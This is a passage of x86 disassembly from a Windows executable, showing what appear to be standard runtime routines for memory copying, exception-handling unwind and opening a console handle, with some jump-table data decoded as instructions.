  408f28:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  408f2d:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  408f31:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  408f36:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  408f3b:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  408f40:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  408f45:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  408f4a:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  408f4f:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  408f54:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  408f59:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  408f5e:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  408f63:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  408f68:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  408f6e:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  408f74:	49                   	dec    %ecx
  408f75:	75 a3                	jne    0x408f1a
  408f77:	8b 75 f8             	mov    -0x8(%ebp),%esi
  408f7a:	8b 7d fc             	mov    -0x4(%ebp),%edi
  408f7d:	8b e5                	mov    %ebp,%esp
  408f7f:	5d                   	pop    %ebp
  408f80:	c3                   	ret
  408f81:	55                   	push   %ebp
  408f82:	8b ec                	mov    %esp,%ebp
  408f84:	83 ec 1c             	sub    $0x1c,%esp
  408f87:	89 7d f4             	mov    %edi,-0xc(%ebp)
  408f8a:	89 75 f8             	mov    %esi,-0x8(%ebp)
  408f8d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408f90:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408f93:	8b c3                	mov    %ebx,%eax
  408f95:	99                   	cltd
  408f96:	8b c8                	mov    %eax,%ecx
  408f98:	8b 45 08             	mov    0x8(%ebp),%eax
  408f9b:	33 ca                	xor    %edx,%ecx
  408f9d:	2b ca                	sub    %edx,%ecx
  408f9f:	83 e1 0f             	and    $0xf,%ecx
  408fa2:	33 ca                	xor    %edx,%ecx
  408fa4:	2b ca                	sub    %edx,%ecx
  408fa6:	99                   	cltd
  408fa7:	8b f8                	mov    %eax,%edi
  408fa9:	33 fa                	xor    %edx,%edi
  408fab:	2b fa                	sub    %edx,%edi
  408fad:	83 e7 0f             	and    $0xf,%edi
  408fb0:	33 fa                	xor    %edx,%edi
  408fb2:	2b fa                	sub    %edx,%edi
  408fb4:	8b d1                	mov    %ecx,%edx
  408fb6:	0b d7                	or     %edi,%edx
  408fb8:	75 4a                	jne    0x409004
  408fba:	8b 75 10             	mov    0x10(%ebp),%esi
  408fbd:	8b ce                	mov    %esi,%ecx
  408fbf:	83 e1 7f             	and    $0x7f,%ecx
  408fc2:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  408fc5:	3b f1                	cmp    %ecx,%esi
  408fc7:	74 13                	je     0x408fdc
  408fc9:	2b f1                	sub    %ecx,%esi
  408fcb:	56                   	push   %esi
  408fcc:	53                   	push   %ebx
  408fcd:	50                   	push   %eax
  408fce:	e8 27 ff ff ff       	call   0x408efa
  408fd3:	83 c4 0c             	add    $0xc,%esp
  408fd6:	8b 45 08             	mov    0x8(%ebp),%eax
  408fd9:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408fdc:	85 c9                	test   %ecx,%ecx
  408fde:	74 77                	je     0x409057
  408fe0:	8b 5d 10             	mov    0x10(%ebp),%ebx
  408fe3:	8b 55 0c             	mov    0xc(%ebp),%edx
  408fe6:	03 d3                	add    %ebx,%edx
  408fe8:	2b d1                	sub    %ecx,%edx
  408fea:	89 55 ec             	mov    %edx,-0x14(%ebp)
  408fed:	03 d8                	add    %eax,%ebx
  408fef:	2b d9                	sub    %ecx,%ebx
  408ff1:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  408ff4:	8b 75 ec             	mov    -0x14(%ebp),%esi
  408ff7:	8b 7d f0             	mov    -0x10(%ebp),%edi
  408ffa:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408ffd:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408fff:	8b 45 08             	mov    0x8(%ebp),%eax
  409002:	eb 53                	jmp    0x409057
  409004:	3b cf                	cmp    %edi,%ecx
  409006:	75 35                	jne    0x40903d
  409008:	f7 d9                	neg    %ecx
  40900a:	83 c1 10             	add    $0x10,%ecx
  40900d:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  409010:	8b 75 0c             	mov    0xc(%ebp),%esi
  409013:	8b 7d 08             	mov    0x8(%ebp),%edi
  409016:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  409019:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40901b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40901e:	03 4d e4             	add    -0x1c(%ebp),%ecx
  409021:	8b 55 0c             	mov    0xc(%ebp),%edx
  409024:	03 55 e4             	add    -0x1c(%ebp),%edx
  409027:	8b 45 10             	mov    0x10(%ebp),%eax
  40902a:	2b 45 e4             	sub    -0x1c(%ebp),%eax
  40902d:	50                   	push   %eax
  40902e:	52                   	push   %edx
  40902f:	51                   	push   %ecx
  409030:	e8 4c ff ff ff       	call   0x408f81
  409035:	83 c4 0c             	add    $0xc,%esp
  409038:	8b 45 08             	mov    0x8(%ebp),%eax
  40903b:	eb 1a                	jmp    0x409057
  40903d:	8b 75 0c             	mov    0xc(%ebp),%esi
  409040:	8b 7d 08             	mov    0x8(%ebp),%edi
  409043:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409046:	8b d1                	mov    %ecx,%edx
  409048:	c1 e9 02             	shr    $0x2,%ecx
  40904b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40904d:	8b ca                	mov    %edx,%ecx
  40904f:	83 e1 03             	and    $0x3,%ecx
  409052:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  409054:	8b 45 08             	mov    0x8(%ebp),%eax
  409057:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40905a:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40905d:	8b 7d f4             	mov    -0xc(%ebp),%edi
  409060:	8b e5                	mov    %ebp,%esp
  409062:	5d                   	pop    %ebp
  409063:	c3                   	ret
  409064:	cc                   	int3
  409065:	cc                   	int3
  409066:	cc                   	int3
  409067:	cc                   	int3
  409068:	cc                   	int3
  409069:	cc                   	int3
  40906a:	cc                   	int3
  40906b:	cc                   	int3
  40906c:	cc                   	int3
  40906d:	cc                   	int3
  40906e:	cc                   	int3
  40906f:	cc                   	int3
  409070:	55                   	push   %ebp
  409071:	8b ec                	mov    %esp,%ebp
  409073:	57                   	push   %edi
  409074:	56                   	push   %esi
  409075:	8b 75 0c             	mov    0xc(%ebp),%esi
  409078:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40907b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40907e:	8b c1                	mov    %ecx,%eax
  409080:	8b d1                	mov    %ecx,%edx
  409082:	03 c6                	add    %esi,%eax
  409084:	3b fe                	cmp    %esi,%edi
  409086:	76 08                	jbe    0x409090
  409088:	3b f8                	cmp    %eax,%edi
  40908a:	0f 82 a4 01 00 00    	jb     0x409234
  409090:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  409096:	72 1f                	jb     0x4090b7
  409098:	83 3d 60 e9 40 00 00 	cmpl   $0x0,0x40e960
  40909f:	74 16                	je     0x4090b7
  4090a1:	57                   	push   %edi
  4090a2:	56                   	push   %esi
  4090a3:	83 e7 0f             	and    $0xf,%edi
  4090a6:	83 e6 0f             	and    $0xf,%esi
  4090a9:	3b fe                	cmp    %esi,%edi
  4090ab:	5e                   	pop    %esi
  4090ac:	5f                   	pop    %edi
  4090ad:	75 08                	jne    0x4090b7
  4090af:	5e                   	pop    %esi
  4090b0:	5f                   	pop    %edi
  4090b1:	5d                   	pop    %ebp
  4090b2:	e9 ca fe ff ff       	jmp    0x408f81
  4090b7:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4090bd:	75 15                	jne    0x4090d4
  4090bf:	c1 e9 02             	shr    $0x2,%ecx
  4090c2:	83 e2 03             	and    $0x3,%edx
  4090c5:	83 f9 08             	cmp    $0x8,%ecx
  4090c8:	72 2a                	jb     0x4090f4
  4090ca:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4090cc:	ff 24 95 e4 91 40 00 	jmp    *0x4091e4(,%edx,4)
  4090d3:	90                   	nop
  4090d4:	8b c7                	mov    %edi,%eax
  4090d6:	ba 03 00 00 00       	mov    $0x3,%edx
  4090db:	83 e9 04             	sub    $0x4,%ecx
  4090de:	72 0c                	jb     0x4090ec
  4090e0:	83 e0 03             	and    $0x3,%eax
  4090e3:	03 c8                	add    %eax,%ecx
  4090e5:	ff 24 85 f8 90 40 00 	jmp    *0x4090f8(,%eax,4)
  4090ec:	ff 24 8d f4 91 40 00 	jmp    *0x4091f4(,%ecx,4)
  4090f3:	90                   	nop
  4090f4:	ff 24 8d 78 91 40 00 	jmp    *0x409178(,%ecx,4)
  4090fb:	90                   	nop
  4090fc:	08 91 40 00 34 91    	or     %dl,-0x6ecbffc0(%ecx)
  409102:	40                   	inc    %eax
  409103:	00 58 91             	add    %bl,-0x6f(%eax)
  409106:	40                   	inc    %eax
  409107:	00 23                	add    %ah,(%ebx)
  409109:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  40910f:	46                   	inc    %esi
  409110:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  409116:	02 c1                	add    %cl,%al
  409118:	e9 02 88 47 02       	jmp    0x288191f
  40911d:	83 c6 03             	add    $0x3,%esi
  409120:	83 c7 03             	add    $0x3,%edi
  409123:	83 f9 08             	cmp    $0x8,%ecx
  409126:	72 cc                	jb     0x4090f4
  409128:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40912a:	ff 24 95 e4 91 40 00 	jmp    *0x4091e4(,%edx,4)
  409131:	8d 49 00             	lea    0x0(%ecx),%ecx
  409134:	23 d1                	and    %ecx,%edx
  409136:	8a 06                	mov    (%esi),%al
  409138:	88 07                	mov    %al,(%edi)
  40913a:	8a 46 01             	mov    0x1(%esi),%al
  40913d:	c1 e9 02             	shr    $0x2,%ecx
  409140:	88 47 01             	mov    %al,0x1(%edi)
  409143:	83 c6 02             	add    $0x2,%esi
  409146:	83 c7 02             	add    $0x2,%edi
  409149:	83 f9 08             	cmp    $0x8,%ecx
  40914c:	72 a6                	jb     0x4090f4
  40914e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409150:	ff 24 95 e4 91 40 00 	jmp    *0x4091e4(,%edx,4)
  409157:	90                   	nop
  409158:	23 d1                	and    %ecx,%edx
  40915a:	8a 06                	mov    (%esi),%al
  40915c:	88 07                	mov    %al,(%edi)
  40915e:	83 c6 01             	add    $0x1,%esi
  409161:	c1 e9 02             	shr    $0x2,%ecx
  409164:	83 c7 01             	add    $0x1,%edi
  409167:	83 f9 08             	cmp    $0x8,%ecx
  40916a:	72 88                	jb     0x4090f4
  40916c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40916e:	ff 24 95 e4 91 40 00 	jmp    *0x4091e4(,%edx,4)
  409175:	8d 49 00             	lea    0x0(%ecx),%ecx
  409178:	db 91 40 00 c8 91    	fistl  -0x6e37ffc0(%ecx)
  40917e:	40                   	inc    %eax
  40917f:	00 c0                	add    %al,%al
  409181:	91                   	xchg   %eax,%ecx
  409182:	40                   	inc    %eax
  409183:	00 b8 91 40 00 b0    	add    %bh,-0x4fffbf6f(%eax)
  409189:	91                   	xchg   %eax,%ecx
  40918a:	40                   	inc    %eax
  40918b:	00 a8 91 40 00 a0    	add    %ch,-0x5fffbf6f(%eax)
  409191:	91                   	xchg   %eax,%ecx
  409192:	40                   	inc    %eax
  409193:	00 98 91 40 00 8b    	add    %bl,-0x74ffbf6f(%eax)
  409199:	44                   	inc    %esp
  40919a:	8e e4                	mov    %esp,%fs
  40919c:	89 44 8f e4          	mov    %eax,-0x1c(%edi,%ecx,4)
  4091a0:	8b 44 8e e8          	mov    -0x18(%esi,%ecx,4),%eax
  4091a4:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  4091a8:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  4091ac:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  4091b0:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  4091b4:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  4091b8:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  4091bc:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  4091c0:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  4091c4:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  4091c8:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  4091cc:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  4091d0:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4091d7:	03 f0                	add    %eax,%esi
  4091d9:	03 f8                	add    %eax,%edi
  4091db:	ff 24 95 e4 91 40 00 	jmp    *0x4091e4(,%edx,4)
  4091e2:	8b ff                	mov    %edi,%edi
  4091e4:	f4                   	hlt
  4091e5:	91                   	xchg   %eax,%ecx
  4091e6:	40                   	inc    %eax
  4091e7:	00 fc                	add    %bh,%ah
  4091e9:	91                   	xchg   %eax,%ecx
  4091ea:	40                   	inc    %eax
  4091eb:	00 08                	add    %cl,(%eax)
  4091ed:	92                   	xchg   %eax,%edx
  4091ee:	40                   	inc    %eax
  4091ef:	00 1c 92             	add    %bl,(%edx,%edx,4)
  4091f2:	40                   	inc    %eax
  4091f3:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4091f9:	c9                   	leave
  4091fa:	c3                   	ret
  4091fb:	90                   	nop
  4091fc:	8a 06                	mov    (%esi),%al
  4091fe:	88 07                	mov    %al,(%edi)
  409200:	8b 45 08             	mov    0x8(%ebp),%eax
  409203:	5e                   	pop    %esi
  409204:	5f                   	pop    %edi
  409205:	c9                   	leave
  409206:	c3                   	ret
  409207:	90                   	nop
  409208:	8a 06                	mov    (%esi),%al
  40920a:	88 07                	mov    %al,(%edi)
  40920c:	8a 46 01             	mov    0x1(%esi),%al
  40920f:	88 47 01             	mov    %al,0x1(%edi)
  409212:	8b 45 08             	mov    0x8(%ebp),%eax
  409215:	5e                   	pop    %esi
  409216:	5f                   	pop    %edi
  409217:	c9                   	leave
  409218:	c3                   	ret
  409219:	8d 49 00             	lea    0x0(%ecx),%ecx
  40921c:	8a 06                	mov    (%esi),%al
  40921e:	88 07                	mov    %al,(%edi)
  409220:	8a 46 01             	mov    0x1(%esi),%al
  409223:	88 47 01             	mov    %al,0x1(%edi)
  409226:	8a 46 02             	mov    0x2(%esi),%al
  409229:	88 47 02             	mov    %al,0x2(%edi)
  40922c:	8b 45 08             	mov    0x8(%ebp),%eax
  40922f:	5e                   	pop    %esi
  409230:	5f                   	pop    %edi
  409231:	c9                   	leave
  409232:	c3                   	ret
  409233:	90                   	nop
  409234:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  409238:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  40923c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  409242:	75 24                	jne    0x409268
  409244:	c1 e9 02             	shr    $0x2,%ecx
  409247:	83 e2 03             	and    $0x3,%edx
  40924a:	83 f9 08             	cmp    $0x8,%ecx
  40924d:	72 0d                	jb     0x40925c
  40924f:	fd                   	std
  409250:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409252:	fc                   	cld
  409253:	ff 24 95 80 93 40 00 	jmp    *0x409380(,%edx,4)
  40925a:	8b ff                	mov    %edi,%edi
  40925c:	f7 d9                	neg    %ecx
  40925e:	ff 24 8d 30 93 40 00 	jmp    *0x409330(,%ecx,4)
  409265:	8d 49 00             	lea    0x0(%ecx),%ecx
  409268:	8b c7                	mov    %edi,%eax
  40926a:	ba 03 00 00 00       	mov    $0x3,%edx
  40926f:	83 f9 04             	cmp    $0x4,%ecx
  409272:	72 0c                	jb     0x409280
  409274:	83 e0 03             	and    $0x3,%eax
  409277:	2b c8                	sub    %eax,%ecx
  409279:	ff 24 85 84 92 40 00 	jmp    *0x409284(,%eax,4)
  409280:	ff 24 8d 80 93 40 00 	jmp    *0x409380(,%ecx,4)
  409287:	90                   	nop
  409288:	94                   	xchg   %eax,%esp
  409289:	92                   	xchg   %eax,%edx
  40928a:	40                   	inc    %eax
  40928b:	00 b8 92 40 00 e0    	add    %bh,-0x1fffbf6e(%eax)
  409291:	92                   	xchg   %eax,%edx
  409292:	40                   	inc    %eax
  409293:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  409299:	88 47 03             	mov    %al,0x3(%edi)
  40929c:	83 ee 01             	sub    $0x1,%esi
  40929f:	c1 e9 02             	shr    $0x2,%ecx
  4092a2:	83 ef 01             	sub    $0x1,%edi
  4092a5:	83 f9 08             	cmp    $0x8,%ecx
  4092a8:	72 b2                	jb     0x40925c
  4092aa:	fd                   	std
  4092ab:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4092ad:	fc                   	cld
  4092ae:	ff 24 95 80 93 40 00 	jmp    *0x409380(,%edx,4)
  4092b5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4092b8:	8a 46 03             	mov    0x3(%esi),%al
  4092bb:	23 d1                	and    %ecx,%edx
  4092bd:	88 47 03             	mov    %al,0x3(%edi)
  4092c0:	8a 46 02             	mov    0x2(%esi),%al
  4092c3:	c1 e9 02             	shr    $0x2,%ecx
  4092c6:	88 47 02             	mov    %al,0x2(%edi)
  4092c9:	83 ee 02             	sub    $0x2,%esi
  4092cc:	83 ef 02             	sub    $0x2,%edi
  4092cf:	83 f9 08             	cmp    $0x8,%ecx
  4092d2:	72 88                	jb     0x40925c
  4092d4:	fd                   	std
  4092d5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4092d7:	fc                   	cld
  4092d8:	ff 24 95 80 93 40 00 	jmp    *0x409380(,%edx,4)
  4092df:	90                   	nop
  4092e0:	8a 46 03             	mov    0x3(%esi),%al
  4092e3:	23 d1                	and    %ecx,%edx
  4092e5:	88 47 03             	mov    %al,0x3(%edi)
  4092e8:	8a 46 02             	mov    0x2(%esi),%al
  4092eb:	88 47 02             	mov    %al,0x2(%edi)
  4092ee:	8a 46 01             	mov    0x1(%esi),%al
  4092f1:	c1 e9 02             	shr    $0x2,%ecx
  4092f4:	88 47 01             	mov    %al,0x1(%edi)
  4092f7:	83 ee 03             	sub    $0x3,%esi
  4092fa:	83 ef 03             	sub    $0x3,%edi
  4092fd:	83 f9 08             	cmp    $0x8,%ecx
  409300:	0f 82 56 ff ff ff    	jb     0x40925c
  409306:	fd                   	std
  409307:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409309:	fc                   	cld
  40930a:	ff 24 95 80 93 40 00 	jmp    *0x409380(,%edx,4)
  409311:	8d 49 00             	lea    0x0(%ecx),%ecx
  409314:	34 93                	xor    $0x93,%al
  409316:	40                   	inc    %eax
  409317:	00 3c 93             	add    %bh,(%ebx,%edx,4)
  40931a:	40                   	inc    %eax
  40931b:	00 44 93 40          	add    %al,0x40(%ebx,%edx,4)
  40931f:	00 4c 93 40          	add    %cl,0x40(%ebx,%edx,4)
  409323:	00 54 93 40          	add    %dl,0x40(%ebx,%edx,4)
  409327:	00 5c 93 40          	add    %bl,0x40(%ebx,%edx,4)
  40932b:	00 64 93 40          	add    %ah,0x40(%ebx,%edx,4)
  40932f:	00 77 93             	add    %dh,-0x6d(%edi)
  409332:	40                   	inc    %eax
  409333:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  409339:	44                   	inc    %esp
  40933a:	8f                   	(bad)
  40933b:	1c 8b                	sbb    $0x8b,%al
  40933d:	44                   	inc    %esp
  40933e:	8e 18                	mov    (%eax),%ds
  409340:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  409344:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  409348:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40934c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  409350:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  409354:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  409358:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40935c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  409360:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  409364:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  409368:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40936c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  409373:	03 f0                	add    %eax,%esi
  409375:	03 f8                	add    %eax,%edi
  409377:	ff 24 95 80 93 40 00 	jmp    *0x409380(,%edx,4)
  40937e:	8b ff                	mov    %edi,%edi
  409380:	90                   	nop
  409381:	93                   	xchg   %eax,%ebx
  409382:	40                   	inc    %eax
  409383:	00 98 93 40 00 a8    	add    %bl,-0x57ffbf6d(%eax)
  409389:	93                   	xchg   %eax,%ebx
  40938a:	40                   	inc    %eax
  40938b:	00 bc 93 40 00 8b 45 	add    %bh,0x458b0040(%ebx,%edx,4)
  409392:	08 5e 5f             	or     %bl,0x5f(%esi)
  409395:	c9                   	leave
  409396:	c3                   	ret
  409397:	90                   	nop
  409398:	8a 46 03             	mov    0x3(%esi),%al
  40939b:	88 47 03             	mov    %al,0x3(%edi)
  40939e:	8b 45 08             	mov    0x8(%ebp),%eax
  4093a1:	5e                   	pop    %esi
  4093a2:	5f                   	pop    %edi
  4093a3:	c9                   	leave
  4093a4:	c3                   	ret
  4093a5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4093a8:	8a 46 03             	mov    0x3(%esi),%al
  4093ab:	88 47 03             	mov    %al,0x3(%edi)
  4093ae:	8a 46 02             	mov    0x2(%esi),%al
  4093b1:	88 47 02             	mov    %al,0x2(%edi)
  4093b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4093b7:	5e                   	pop    %esi
  4093b8:	5f                   	pop    %edi
  4093b9:	c9                   	leave
  4093ba:	c3                   	ret
  4093bb:	90                   	nop
  4093bc:	8a 46 03             	mov    0x3(%esi),%al
  4093bf:	88 47 03             	mov    %al,0x3(%edi)
  4093c2:	8a 46 02             	mov    0x2(%esi),%al
  4093c5:	88 47 02             	mov    %al,0x2(%edi)
  4093c8:	8a 46 01             	mov    0x1(%esi),%al
  4093cb:	88 47 01             	mov    %al,0x1(%edi)
  4093ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4093d1:	5e                   	pop    %esi
  4093d2:	5f                   	pop    %edi
  4093d3:	c9                   	leave
  4093d4:	c3                   	ret
  4093d5:	cc                   	int3
  4093d6:	cc                   	int3
  4093d7:	cc                   	int3
  4093d8:	55                   	push   %ebp
  4093d9:	8b ec                	mov    %esp,%ebp
  4093db:	53                   	push   %ebx
  4093dc:	56                   	push   %esi
  4093dd:	57                   	push   %edi
  4093de:	55                   	push   %ebp
  4093df:	6a 00                	push   $0x0
  4093e1:	6a 00                	push   $0x0
  4093e3:	68 f0 93 40 00       	push   $0x4093f0
  4093e8:	ff 75 08             	push   0x8(%ebp)
  4093eb:	e8 5e 09 00 00       	call   0x409d4e
  4093f0:	5d                   	pop    %ebp
  4093f1:	5f                   	pop    %edi
  4093f2:	5e                   	pop    %esi
  4093f3:	5b                   	pop    %ebx
  4093f4:	8b e5                	mov    %ebp,%esp
  4093f6:	5d                   	pop    %ebp
  4093f7:	c3                   	ret
  4093f8:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4093fc:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  409403:	b8 01 00 00 00       	mov    $0x1,%eax
  409408:	74 32                	je     0x40943c
  40940a:	8b 44 24 14          	mov    0x14(%esp),%eax
  40940e:	8b 48 fc             	mov    -0x4(%eax),%ecx
  409411:	33 c8                	xor    %eax,%ecx
  409413:	e8 d7 b7 ff ff       	call   0x404bef
  409418:	55                   	push   %ebp
  409419:	8b 68 10             	mov    0x10(%eax),%ebp
  40941c:	8b 50 28             	mov    0x28(%eax),%edx
  40941f:	52                   	push   %edx
  409420:	8b 50 24             	mov    0x24(%eax),%edx
  409423:	52                   	push   %edx
  409424:	e8 14 00 00 00       	call   0x40943d
  409429:	83 c4 08             	add    $0x8,%esp
  40942c:	5d                   	pop    %ebp
  40942d:	8b 44 24 08          	mov    0x8(%esp),%eax
  409431:	8b 54 24 10          	mov    0x10(%esp),%edx
  409435:	89 02                	mov    %eax,(%edx)
  409437:	b8 03 00 00 00       	mov    $0x3,%eax
  40943c:	c3                   	ret
  40943d:	53                   	push   %ebx
  40943e:	56                   	push   %esi
  40943f:	57                   	push   %edi
  409440:	8b 44 24 10          	mov    0x10(%esp),%eax
  409444:	55                   	push   %ebp
  409445:	50                   	push   %eax
  409446:	6a fe                	push   $0xfffffffe
  409448:	68 f8 93 40 00       	push   $0x4093f8
  40944d:	64 ff 35 00 00 00 00 	push   %fs:0x0
  409454:	a1 60 db 40 00       	mov    0x40db60,%eax
  409459:	33 c4                	xor    %esp,%eax
  40945b:	50                   	push   %eax
  40945c:	8d 44 24 04          	lea    0x4(%esp),%eax
  409460:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  409466:	8b 44 24 28          	mov    0x28(%esp),%eax
  40946a:	8b 58 08             	mov    0x8(%eax),%ebx
  40946d:	8b 70 0c             	mov    0xc(%eax),%esi
  409470:	83 fe ff             	cmp    $0xffffffff,%esi
  409473:	74 3a                	je     0x4094af
  409475:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
  40947a:	74 06                	je     0x409482
  40947c:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  409480:	76 2d                	jbe    0x4094af
  409482:	8d 34 76             	lea    (%esi,%esi,2),%esi
  409485:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  409488:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40948c:	89 48 0c             	mov    %ecx,0xc(%eax)
  40948f:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  409494:	75 17                	jne    0x4094ad
  409496:	68 01 01 00 00       	push   $0x101
  40949b:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  40949f:	e8 49 00 00 00       	call   0x4094ed
  4094a4:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  4094a8:	e8 5f 00 00 00       	call   0x40950c
  4094ad:	eb b7                	jmp    0x409466
  4094af:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4094b3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4094ba:	83 c4 18             	add    $0x18,%esp
  4094bd:	5f                   	pop    %edi
  4094be:	5e                   	pop    %esi
  4094bf:	5b                   	pop    %ebx
  4094c0:	c3                   	ret
  4094c1:	33 c0                	xor    %eax,%eax
  4094c3:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  4094ca:	81 79 04 f8 93 40 00 	cmpl   $0x4093f8,0x4(%ecx)
  4094d1:	75 10                	jne    0x4094e3
  4094d3:	8b 51 0c             	mov    0xc(%ecx),%edx
  4094d6:	8b 52 0c             	mov    0xc(%edx),%edx
  4094d9:	39 51 08             	cmp    %edx,0x8(%ecx)
  4094dc:	75 05                	jne    0x4094e3
  4094de:	b8 01 00 00 00       	mov    $0x1,%eax
  4094e3:	c3                   	ret
  4094e4:	53                   	push   %ebx
  4094e5:	51                   	push   %ecx
  4094e6:	bb c0 dd 40 00       	mov    $0x40ddc0,%ebx
  4094eb:	eb 0b                	jmp    0x4094f8
  4094ed:	53                   	push   %ebx
  4094ee:	51                   	push   %ecx
  4094ef:	bb c0 dd 40 00       	mov    $0x40ddc0,%ebx
  4094f4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4094f8:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4094fb:	89 43 04             	mov    %eax,0x4(%ebx)
  4094fe:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  409501:	55                   	push   %ebp
  409502:	51                   	push   %ecx
  409503:	50                   	push   %eax
  409504:	58                   	pop    %eax
  409505:	59                   	pop    %ecx
  409506:	5d                   	pop    %ebp
  409507:	59                   	pop    %ecx
  409508:	5b                   	pop    %ebx
  409509:	c2 04 00             	ret    $0x4
  40950c:	ff d0                	call   *%eax
  40950e:	c3                   	ret
  40950f:	33 c0                	xor    %eax,%eax
  409511:	50                   	push   %eax
  409512:	50                   	push   %eax
  409513:	6a 03                	push   $0x3
  409515:	50                   	push   %eax
  409516:	6a 03                	push   $0x3
  409518:	68 00 00 00 40       	push   $0x40000000
  40951d:	68 6c b3 40 00       	push   $0x40b36c
  409522:	ff 15 28 a0 40 00    	call   *0x40a028
  409528:	a3 d4 dd 40 00       	mov    %eax,0x40ddd4
  40952d:	c3                   	ret
  40952e:	a1 d4 dd 40 00       	mov    0x40ddd4,%eax
  409533:	56                   	push   %esi
  409534:	8b 35 30 a0 40 00    	mov    0x40a030,%esi
  40953a:	83 f8 ff             	cmp    $0xffffffff,%eax
